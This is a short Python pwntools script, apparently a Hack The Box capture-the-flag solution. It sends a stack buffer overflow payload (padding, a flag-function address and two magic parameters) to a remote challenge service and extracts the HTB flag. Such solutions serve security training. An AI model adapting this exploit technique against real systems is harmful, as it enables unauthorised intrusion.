#!/usr/bin/env python3

from pwn import *
import re

exe = context.binary = ELF('./vuln', checksec=False)
# p = process(exe.path)
p = remote("138.68.163.188", "32538")
context.update(arch="i386")

OFFSET = 188
PADDING = b'A' * OFFSET

flag_func = p32(0x080491e2)
param1 = p32(0xdeadbeef)
param2 = p32(0xc0ded00d)
payload = PADDING + flag_func + b"AAAA" + param1 + param2

# with open("payload.bin", "wb") as f:
#     f.write(payload)

p.sendlineafter(b'0xDiablos: \n', payload)
respone = p.recv()
# p.interactive()
print(respone)
if b"HTB{" in respone:
    flag = re.findall("HTB{.*}", str(respone))
    log.success(f"Flag: {flag[0]}")
